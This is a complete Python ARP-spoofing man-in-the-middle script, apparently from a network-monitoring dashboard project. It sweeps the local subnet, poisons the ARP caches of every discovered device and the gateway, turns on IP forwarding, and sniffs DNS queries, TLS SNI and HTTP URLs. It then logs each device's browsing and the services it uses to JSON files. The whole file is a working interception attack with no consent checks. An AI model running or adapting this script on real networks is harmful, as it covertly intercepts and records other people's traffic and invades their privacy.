#!/usr/bin/env python3
"""ARP spoofing MITM — makes the macbook see ALL device traffic.
Requires root. Run via: sudo python3 arpspoof.py or via osascript.

Writes intercepted DNS + TLS SNI to state.json so the panel shows
browsing from ALL devices on the network, not just the macbook.
"""
import sys, os, time, struct, threading, signal, json
from collections import defaultdict

try:
    import scapy.all as scapy
    from scapy.layers.l2 import Ether, ARP, srp
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.packet import Raw
    sniff = scapy.sniff
    sendp = scapy.sendp
    conf = scapy.conf
    get_if_hwaddr = scapy.get_if_hwaddr
except ImportError:
    print("pip3 install scapy", file=sys.stderr)
    sys.exit(1)

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)
try:
    from device_detect import detect_device
    HAS_DEVICE_DETECT = True
except ImportError:
    HAS_DEVICE_DETECT = False
try:
    from oui_db import lookup_vendor
    HAS_OUI = True
except ImportError:
    HAS_OUI = False

DATA = os.path.join(ROOT, "data")
IFACE = "en0"
SPOOF_INTERVAL = 2
LOGFILE = "/tmp/netwatch-arpspoof.log"

# ─── State ───────────────────────────────────────────────────────────
state = {
    "iface": IFACE,
    "packets": 0,
    "events": [],
    "domains": {},
    "devices": {},
    "updated": time.time(),
}
state_lock = threading.Lock()

# ─── Helpers ─────────────────────────────────────────────────────────
def get_gateway():
    """Get default gateway IP."""
    import subprocess
    r = subprocess.run(["netstat", "-rn"], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if "default" in line:
            parts = line.split()
            for p in parts:
                if p.count(".") == 3 and not p.startswith("link"):
                    return p
    return "192.168.2.1"

def get_my_ip():
    """Get my IP on IFACE."""
    import subprocess
    r = subprocess.run(["ifconfig", IFACE], capture_output=True, text=True)
    for line in r.stdout.splitlines():
        if "inet " in line:
            return line.split("inet ")[1].split()[0]
    return "192.168.2.42"

def get_arp_table():
    """Parse ARP table to get IP→MAC mappings."""
    import subprocess
    r = subprocess.run(["arp", "-a", "-i", IFACE], capture_output=True, text=True)
    table = {}
    for line in r.stdout.splitlines():
        if "incomplete" in line.lower():
            continue
        parts = line.split()
        for i, p in enumerate(parts):
            if p == "at" and i > 0:
                mac = parts[i - 1].strip("()")
                ip = parts[i + 1].strip("()") if i + 1 < len(parts) else ""
                if ip and mac and mac != "(incomplete)" and "." in ip:
                    table[ip] = mac
    return table

def discover_hosts():
    """ARP scan to discover all hosts on the subnet."""
    import subprocess
    # Get subnet from ifconfig
    r = subprocess.run(["ifconfig", IFACE], capture_output=True, text=True)
    my_ip = "192.168.2.42"
    for line in r.stdout.splitlines():
        if "inet " in line:
            my_ip = line.split("inet ")[1].split()[0]
            break
    
    subnet = ".".join(my_ip.split(".")[:3])
    
    # Send ARP requests to all 254 hosts
    print(f"[*] Scanning subnet {subnet}.0/24...")
    from scapy.layers.l2 import srp as _srp
    ans, _ = _srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{subnet}.0/24"),
                  timeout=3, verbose=0, iface=IFACE)
    
    hosts = {}
    for _, rcv in ans:
        ip = rcv[ARP].psrc
        mac = rcv[Ether].src
        hosts[ip] = mac
        print(f"  [+] {ip} -> {mac}")
    return hosts

def dns_name(buf, off, depth=0):
    labels, end = [], None
    while off < len(buf) and depth < 20:
        ln = buf[off]
        if ln & 0xC0 == 0xC0:
            if off + 1 >= len(buf): break
            ptr = ((ln & 0x3F) << 8) | buf[off + 1]
            if end is None: end = off + 2
            off, depth = ptr, depth + 1
            continue
        if ln == 0:
            if end is None: end = off + 1
            break
        off += 1; depth += 1
        labels.append(buf[off:off + ln].decode("ascii", errors="ignore"))
        off += ln
    return ".".join(labels), end

def parse_dns(buf):
    if len(buf) < 12: return None
    flags = struct.unpack_from(">H", buf, 2)[0]
    qdcount = struct.unpack_from(">H", buf, 4)[0]
    ancount = struct.unpack_from(">H", buf, 6)[0]
    off = 12
    names = []
    for _ in range(qdcount):
        name, end = dns_name(buf, off)
        if end is None: break
        off = end + 4
        names.append(name)
    answers = []
    for _ in range(ancount):
        name, end = dns_name(buf, off)
        if end is None: break
        off = end + 10
        rdlen = struct.unpack_from(">H", buf, off - 2)[0]
        if name:
            answers.append(name)
        off += rdlen
    return {"names": names, "answers": answers, "qr": bool(flags & 0x8000)}

def parse_sni(p):
    try:
        if len(p) < 5 or p[0] != 0x16: return None
        if len(p) < 9 or p[5] != 0x01: return None
        off = 9 + 2 + 32
        if off >= len(p): return None
        sid = p[off]; off += 1 + sid
        if off + 2 >= len(p): return None
        cs = struct.unpack_from(">H", p, off)[0]; off += 2 + cs
        if off >= len(p): return None
        cm = p[off]; off += 1 + cm
        if off + 2 > len(p): return None
        ext_total = struct.unpack_from(">H", p, off)[0]; off += 2
        end = min(off + ext_total, len(p))
        while off + 4 <= end:
            etype, elen = struct.unpack_from(">HH", p, off); off += 4
            if etype == 0 and off + 5 <= len(p):
                nlen = struct.unpack_from(">H", p, off + 3)[0]
                if off + 5 + nlen <= len(p):
                    return p[off + 5:off + 5 + nlen].decode("utf-8", "replace")
                break
            off += elen
    except Exception:
        pass
    return None

def parse_http_host(payload):
    """Extract Host header and URL path from HTTP request."""
    try:
        text = payload.decode("utf-8", "replace")
        if not text.startswith(("GET ", "POST ", "HEAD ", "PUT ", "DELETE ", "CONNECT ")):
            return None, None
        lines = text.split("\r\n")
        if not lines:
            return None, None
        # Parse request line: GET /path HTTP/1.1
        parts = lines[0].split()
        path = parts[1] if len(parts) > 1 else "/"
        host = None
        for line in lines[1:]:
            if line.lower().startswith("host:"):
                host = line.split(":", 1)[1].strip()
                break
        return host, path
    except:
        return None, None

# CDN/content pattern matching
CDN_PATTERNS = {
    "tiktok": {"patterns": ["tiktokcdn.com", "tiktokv.com", "tiktok.com", "byteoversea.com"],
               "icon": "🎵", "type": "video"},
    "youtube": {"patterns": ["youtube.com", "ytimg.com", "googlevideo.com", "youtu.be"],
                "icon": "📺", "type": "video"},
    "instagram": {"patterns": ["instagram.com", "cdninstagram.com", "fbcdn.net"],
                  "icon": "📸", "type": "social"},
    "facebook": {"patterns": ["facebook.com", "fbcdn.net", "fb.com"],
                 "icon": "👤", "type": "social"},
    "twitter": {"patterns": ["twitter.com", "x.com", "twimg.com"],
                "icon": "🐦", "type": "social"},
    "netflix": {"patterns": ["netflix.com", "nflxvideo.net", "nflximg.net"],
                "icon": "🎬", "type": "streaming"},
    "spotify": {"patterns": ["spotify.com", "scdn.co", "spotifycdn.com"],
                "icon": "🎧", "type": "music"},
    "twitch": {"patterns": ["twitch.tv", "ttvnw.net", "jtvnw.net"],
               "icon": "🎮", "type": "streaming"},
    "amazon": {"patterns": ["amazon.com", "amazonaws.com", "cloudfront.net"],
               "icon": "📦", "type": "shopping"},
    "google": {"patterns": ["google.com", "googleapis.com", "gstatic.com", "ggpht.com"],
               "icon": "🔍", "type": "search"},
    "apple": {"patterns": ["apple.com", "icloud.com", "mzstatic.com"],
              "icon": "🍎", "type": "services"},
    "discord": {"patterns": ["discord.com", "discord.gg", "discordapp.com"],
                "icon": "💬", "type": "chat"},
    "reddit": {"patterns": ["reddit.com", "redd.it", "redditstatic.com"],
               "icon": "🤖", "type": "forum"},
    "whatsapp": {"patterns": ["whatsapp.com", "whatsapp.net", "wa.me"],
                 "icon": "📱", "type": "messaging"},
    "telegram": {"patterns": ["telegram.org", "t.me", "telegram.me"],
                 "icon": "✈️", "type": "messaging"},
}

def classify_domain(domain):
    """Classify a domain by CDN/content type. Returns (service, icon, content_type)."""
    if not domain:
        return None, "🌐", "unknown"
    d = domain.lower()
    for service, info in CDN_PATTERNS.items():
        for pattern in info["patterns"]:
            if pattern in d:
                return service, info["icon"], info["type"]
    return None, "🌐", "web"

def add_event(src_ip, kind, host):
    with state_lock:
        # Classify domain for CDN/content type
        service, icon, content_type = classify_domain(host)
        event = {"t": time.time(), "dev": src_ip, "kind": kind, "host": host}
        if service:
            event["service"] = service
            event["content_type"] = content_type
        state["events"].append(event)
        state["events"] = state["events"][-500:]
        state["packets"] += 1

        d = state["domains"].get(host, {"count": 0, "first": time.time(), "last": 0,
                                         "kinds": defaultdict(int), "devs": defaultdict(int),
                                         "service": service, "content_type": content_type})
        d["count"] += 1
        d["last"] = time.time()
        d["kinds"][kind] += 1
        d["devs"][src_ip] += 1
        if service and not d.get("service"):
            d["service"] = service
            d["content_type"] = content_type
        state["domains"][host] = d

        dev = state["devices"].get(src_ip, {
            "ip": src_ip, "mac": "", "hostname": "", "vendor": "",
            "device_type": "", "device_model": "", "device_icon": "📡",
            "interface": IFACE, "first_seen": time.time(), "last_seen": time.time(),
            "online": True, "traffic_events": 0, "domains": {}, "protocols": defaultdict(int),
            "services": defaultdict(int), "urls": [],
        })
        dev["traffic_events"] += 1
        dev["last_seen"] = time.time()
        dev["online"] = True
        dev["protocols"][kind] = dev["protocols"].get(kind, 0) + 1
        if kind in ("tls", "dns", "http"):
            dev["domains"][host] = dev["domains"].get(host, 0) + 1
        # Track services (tiktok, youtube, etc.)
        if service:
            dev.setdefault("services", defaultdict(int))
            dev["services"][service] = dev["services"].get(service, 0) + 1
        # Track interesting URLs (with paths)
        if kind == "http" and "/" in host:
            dev.setdefault("urls", [])
            url_entry = {"url": host, "t": time.time(), "service": service}
            dev["urls"].append(url_entry)
            dev["urls"] = dev["urls"][-100:]  # Keep last 100 URLs

        # Extract hostname from .local names and detect device type
        hostname = dev.get("hostname", "")
        if not hostname and kind == "mdns" and ".local" in host:
            candidate = host.split(".")[0]
            if candidate and not candidate.startswith("_"):
                hostname = candidate
                dev["hostname"] = hostname

        # Device type/model detection
        if HAS_DEVICE_DETECT and (not dev.get("device_type") or dev["device_type"] == "device"):
            info = detect_device(hostname, dev.get("vendor", ""))
            if info["type"] != "device" or not dev.get("device_type"):
                dev["device_type"] = info["type"]
                dev["device_model"] = info["model"]
                dev["device_icon"] = info["icon"]

        state["devices"][src_ip] = dev

def write_state():
    while True:
        with state_lock:
            out = {
                "updated": time.time(), "iface": state["iface"],
                "packets": state["packets"],
                "events": state["events"][-300:],
                "devices": {k: {
                    "ip": v["ip"], "mac": v["mac"], "vendor": v.get("vendor",""),
                    "hostname": v["hostname"], "interface": v["interface"],
                    "device_type": v.get("device_type", "device"),
                    "device_model": v.get("device_model", "Unknown Device"),
                    "device_icon": v.get("device_icon", "📡"),
                    "first_seen": v["first_seen"], "last_seen": v["last_seen"],
                    "online": v["online"], "traffic_events": v["traffic_events"],
                    "domains": v["domains"], "protocols": dict(v["protocols"]),
                    "services": dict(v.get("services", {})),
                    "urls": v.get("urls", [])[-50:],
                } for k, v in state["devices"].items()},
            }
            # Convert domains kinds/devs defaultdicts
            out["domains"] = {}
            for host, d in state["domains"].items():
                out["domains"][host] = {
                    "count": d["count"], "first": d["first"], "last": d["last"],
                    "kinds": dict(d["kinds"]), "devs": dict(d["devs"]),
                    "service": d.get("service"), "content_type": d.get("content_type"),
                }
            state["updated"] = time.time()
            out["updated"] = state["updated"]
        
        os.makedirs(DATA, exist_ok=True)
        path = os.path.join(DATA, "state.json")
        tmp = path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(out, f)
        os.replace(tmp, path)
        
        devs_path = os.path.join(DATA, "devices.json")
        devs_out = {
            "updated": state["updated"], "iface": state["iface"],
            "count": len(state["devices"]),
            "devices": state["devices"],
        }
        tmp = devs_path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(devs_out, f, default=str)
        os.replace(tmp, devs_path)
        
        time.sleep(2)

# ─── Packet handler ─────────────────────────────────────────────────
def handle_packet(pkt):
    if not pkt.haslayer(IP): return
    src_ip = pkt[IP].src
    
    # Skip our own traffic (unless it's interesting)
    my_ip = get_my_ip()
    
    if pkt.haslayer(UDP) and pkt.haslayer(Raw):
        dport = pkt[UDP].dport
        sport = pkt[UDP].sport
        payload = bytes(pkt[Raw].load)
        
        if dport == 53 or sport == 53:
            dns = parse_dns(payload)
            if dns:
                for name in (dns["names"] + dns["answers"]):
                    if name and "." in name and not name.endswith(".in-addr.arpa"):
                        add_event(src_ip, "dns", name)
        
        elif dport == 5353 or sport == 5353:
            dns = parse_dns(payload)
            if dns:
                for name in (dns["names"] + dns["answers"]):
                    if name and "." in name:
                        add_event(src_ip, "mdns", name)
    
    elif pkt.haslayer(TCP) and pkt.haslayer(Raw):
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport
        payload = bytes(pkt[Raw].load)
        
        if dport == 443 and len(payload) > 5:
            if payload[0] == 0x16 and payload[5] == 0x01:
                sni = parse_sni(payload)
                if sni:
                    add_event(src_ip, "tls", sni)
        
        # HTTP traffic (port 80 or 8080)
        elif (dport == 80 or dport == 8080) and len(payload) > 10:
            host, path = parse_http_host(payload)
            if host:
                # Classify the domain
                service, icon, content_type = classify_domain(host)
                # Add event with URL path if interesting
                if path and path != "/" and not path.startswith(("/favicon", "/robots.txt", "/sitemap")):
                    full_url = f"{host}{path}"
                    add_event(src_ip, "http", full_url)
                else:
                    add_event(src_ip, "http", host)

# ─── ARP Spoofing ───────────────────────────────────────────────────
class ARPSpoofer:
    def __init__(self, gateway_ip, my_mac, my_ip):
        self.gateway_ip = gateway_ip
        self.my_mac = my_mac
        self.my_ip = my_ip
        self.targets = {}  # ip -> mac
        self.running = False
        self._stop = threading.Event()
    
    def set_targets(self, targets):
        """targets = {ip: mac}"""
        self.targets = {ip: mac for ip, mac in targets.items() if ip != self.my_ip}
        print(f"[*] Spoofing {len(self.targets)} targets")
    
    def _spoof_loop(self):
        """Send forged ARP replies to poison target and gateway."""
        while not self._stop.is_set():
            for target_ip, target_mac in self.targets.items():
                # Tell the target: "I am the gateway"
                pkt1 = Ether(dst=target_mac) / ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.my_mac,
                )
                # Tell the gateway: "I am the target"
                pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=target_ip,
                    hwsrc=self.my_mac,
                )
                try:
                    sendp(pkt1, iface=IFACE, verbose=0)
                    sendp(pkt2, iface=IFACE, verbose=0)
                except Exception:
                    pass
            time.sleep(SPOOF_INTERVAL)
    
    def restore(self):
        """Send correct ARP replies to restore original mappings."""
        print("[*] Restoring ARP tables...")
        for target_ip, target_mac in self.targets.items():
            # Restore target
            pkt1 = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=self.gateway_ip, hwsrc=self.gateway_mac,
            )
            # Restore gateway
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                psrc=target_ip, hwsrc=target_mac,
            )
            try:
                sendp(pkt1, iface=IFACE, verbose=0)
                sendp(pkt2, iface=IFACE, verbose=0)
            except Exception:
                pass
        print("[*] ARP tables restored")
    
    def start(self):
        self.running = True
        self._stop.clear()
        t = threading.Thread(target=self._spoof_loop, daemon=True)
        t.start()
        return t
    
    def stop(self):
        self._stop.set()
        self.running = False

# ─── Main ────────────────────────────────────────────────────────────
def enable_ip_forward():
    os.system("sysctl -w net.inet.ip.forwarding=1")
    print("[+] IP forwarding enabled")

def disable_ip_forward():
    os.system("sysctl -w net.inet.ip.forwarding=0")
    print("[-] IP forwarding disabled")

def main():
    os.makedirs(DATA, exist_ok=True)
    
    gateway_ip = get_gateway()
    my_ip = get_my_ip()
    my_mac = get_if_hwaddr(IFACE)
    
    print(f"netwatch ARP spoofing MITM")
    print(f"  Interface: {IFACE}")
    print(f"  My IP:     {my_ip}")
    print(f"  My MAC:    {my_mac}")
    print(f"  Gateway:   {gateway_ip}")
    
    # Enable IP forwarding
    enable_ip_forward()
    
    # Discover hosts
    hosts = discover_hosts()
    if not hosts:
        print("[!] No hosts found, using ARP table")
        hosts = get_arp_table()
    
    # Filter out our own IP
    hosts = {ip: mac for ip, mac in hosts.items() if ip != my_ip}
    print(f"[*] {len(hosts)} targets to spoof")

    # Add discovered hosts to state with vendor/type/model
    for ip, mac in hosts.items():
        vendor = lookup_vendor(mac) if HAS_OUI else ""
        info = detect_device("", vendor) if HAS_DEVICE_DETECT else {"type": "device", "model": "Unknown", "icon": "📡"}
        with state_lock:
            dev = state["devices"].get(ip, {
                "ip": ip, "mac": mac, "vendor": vendor, "hostname": "",
                "device_type": info["type"], "device_model": info["model"],
                "device_icon": info["icon"],
                "interface": IFACE, "first_seen": time.time(), "last_seen": time.time(),
                "online": True, "traffic_events": 0, "domains": {}, "protocols": {},
            })
            dev["mac"] = mac
            dev["vendor"] = vendor
            if not dev.get("device_type") or dev["device_type"] == "device":
                dev["device_type"] = info["type"]
                dev["device_model"] = info["model"]
                dev["device_icon"] = info["icon"]
            state["devices"][ip] = dev
    print(f"[+] Added {len(hosts)} devices to state")

    # Get gateway MAC
    arp_table = get_arp_table()
    gateway_mac = arp_table.get(gateway_ip)
    if not gateway_mac:
        print(f"[!] Cannot find gateway MAC for {gateway_ip}")
        # Try to get it via ARP request
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ip),
                      timeout=3, verbose=0, iface=IFACE)
        for _, rcv in ans:
            gateway_mac = rcv[Ether].src
            break
    
    if not gateway_mac:
        print("[!] FATAL: Cannot determine gateway MAC")
        sys.exit(1)
    
    print(f"[*] Gateway MAC: {gateway_mac}")
    
    # Start ARP spoofer
    spoofer = ARPSpoofer(gateway_ip, my_mac, my_ip)
    spoofer.gateway_mac = gateway_mac
    spoofer.set_targets(hosts)
    spoofer.start()
    print("[+] ARP spoofing started")
    
    # Start state writer
    state_thread = threading.Thread(target=write_state, daemon=True)
    state_thread.start()
    
    # Signal handler for cleanup
    def cleanup(sig, frame):
        print("\n[*] Shutting down...")
        spoofer.restore()
        disable_ip_forward()
        write_state()  # Final write
        sys.exit(0)
    
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    # Sniff traffic (filter for TCP/UDP to catch DNS + TLS)
    print("[+] Sniffing traffic... (Ctrl+C to stop)")
    sniff(
        iface=IFACE,
        filter="tcp or udp",
        prn=handle_packet,
        store=0,  # Don't store packets in memory
    )

if __name__ == "__main__":
    main()
